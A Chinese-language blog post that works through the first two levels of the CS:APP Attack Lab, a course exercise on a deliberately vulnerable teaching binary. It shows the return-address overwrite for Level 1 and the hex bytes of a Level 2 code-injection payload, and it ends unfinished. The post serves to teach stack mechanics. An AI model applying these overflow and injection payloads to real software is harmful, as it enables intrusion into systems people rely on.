---
layout: post
title:  "CS:APP Attack Bomb"
categories: Labs
tags: [reverse engineering, disassembling, code injection]
toc: true
--- 
There is some of the same fitness in a man's building his own house that there is in a bird's building its own nest. 
{: .message }

利用缓冲区溢出，完成代码注入与面向返回指令的攻击，深化理解栈机制。

使用 ctarget/rtarget 时，添加 -q 指令避免向服务器请求打分。

总体上有五个实验阶段。

## Level 1

目标是通过缓冲区溢出，使test函数调用getbuf函数后，返回到touch1函数开始处。
{% highlight cpp %}
void test()
{
 int val;
 val = getbuf();
 printf("No exploit. Getbuf returned 0x%x\n", val);
}
{% endhighlight %}

经过 `objdump -d ctarget` 后节选test汇编代码，
{% highlight nasm %}
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
{% endhighlight %}

需要将 401976 地址替换成 touch1 开始地址 4017c0 ，而在函数 getbuf 中栈空间为缓冲区预留了 0x28(40) 个字节，
{% highlight nasm %}
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq 
  4017be:	90                   	nop
  4017bf:	90                   	nop
{% endhighlight %}

所以只需要溢出 40 个字节替换返回地址即可，勿忘输入字符串会额外添加 terminator 且小端编码，
> X X .. X c0 17 40

## Level 2

目的是通过缓冲区溢出，使test函数调用getbuf函数后，返回到touch2函数开始处，并以指定数值作为参数，为此需要注入代码。

注入指令代码，
{% highlight nasm %}
 # Level 2 injection code
	movq $0x59b997fa, %rdi	# use cookie value as 1st parameter of touch2
	push $0x4017ec		# push touch2 address
	retq			# return to touch2
{% endhighlight %}

注意，指令中用的是立即数，小心编写指令。

溢出两个地址，会产生段错误，因为原先第二个位置的值被覆盖了，其不是地址值。

题目要求使用 ret 转移控制，可以通过指令压入 touch2 开始地址。

注入代码在栈上，通过 GDB 调试命令
`
print /x $rsp
`
可以得到buf开始地址为 0x5561dc78 ，大小为 40 个字节。注入代码就放在 buf 中，需要注意栈是向下(向地址0)处增长的，所以代码直接正放即可，

这里需要将指令转为十六进制，再转为 ASCII，可以用 gcc 与 objdump 转换十六进制，用 Lab 提供的工具 hex2raw 转ASCII码。

十六进制表示为，
{% highlight nasm %}
48 c7 c7 fa 97 b9 59 /* mov    $0x59b997fa,%rdi */
68 ec 17 40 00 /* pushq  $0x4017ec */
c3 /* retq */
30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 /* 27 bytes */
78 dc 61 55 00 00 00 00 /* buf start address 0x5561dc78 */
{% endhighlight %}


待续。

{% highlight nasm %}

{% endhighlight %}

## Reference
1. [CS:APP Lab Assignments](http://csapp.cs.cmu.edu/3e/labs.html)
2. [attack lab readme](http://csapp.cs.cmu.edu/3e/README-attacklab)
3. [attack lab writeup](http://csapp.cs.cmu.edu/3e/attacklab.pdf)
4. [Beej's Quick Guide to GDB](http://beej.us/guide/bggdb/)
